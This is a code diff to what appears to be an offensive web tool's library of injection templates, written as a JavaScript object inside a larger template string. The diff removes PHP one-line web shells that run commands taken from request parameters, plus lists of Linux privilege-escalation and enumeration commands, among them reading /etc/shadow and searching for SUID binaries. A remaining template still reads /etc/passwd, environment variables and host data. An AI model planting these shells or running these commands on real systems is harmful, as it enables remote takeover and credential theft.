@@ -2801,43 +2801,6 @@ MASTER_TEMPLATE = """
 
             enumeration: "# System Enumeration\\nhostname && whoami && id\\nuname -a\\ncat /etc/os-release\\nip a\\nnetstat -tulpn\\nps aux\\nenv\\ncat /etc/passwd\\ncat /etc/hosts\\nls -la /home"
         };
-    echo "</pre>";
-    die;
-}
-?>
-
-<?php eval($_POST['cmd']); ?>
-<?php system($_GET['cmd']); ?>
-<?php passthru($_REQUEST['cmd']); ?>
-<?php echo shell_exec($_GET['e']); ?>`,
-
-            privesc: `# Linux Privilege Escalation Commands
-whoami && id
-uname -a
-cat /etc/passwd
-cat /etc/shadow
-sudo -l
-find / -perm -4000 2>/dev/null
-find / -writable -type d 2>/dev/null
-getcap -r / 2>/dev/null
-ps aux | grep root
-cat /etc/crontab
-ls -la /etc/cron*`,
-
-            enumeration: `# System Enumeration
-hostname && whoami && id
-uname -a
-cat /etc/os-release
-ip a
-netstat -tulpn
-ps aux
-env
-cat /etc/passwd
-cat /etc/hosts
-ls -la /home
-find / -name "*.txt" 2>/dev/null | head -20
-find / -name "*.conf" 2>/dev/null | head -20`
-        };
         
         function loadTemplate(type) {
             let template = INJECTION_TEMPLATES[type] || '';
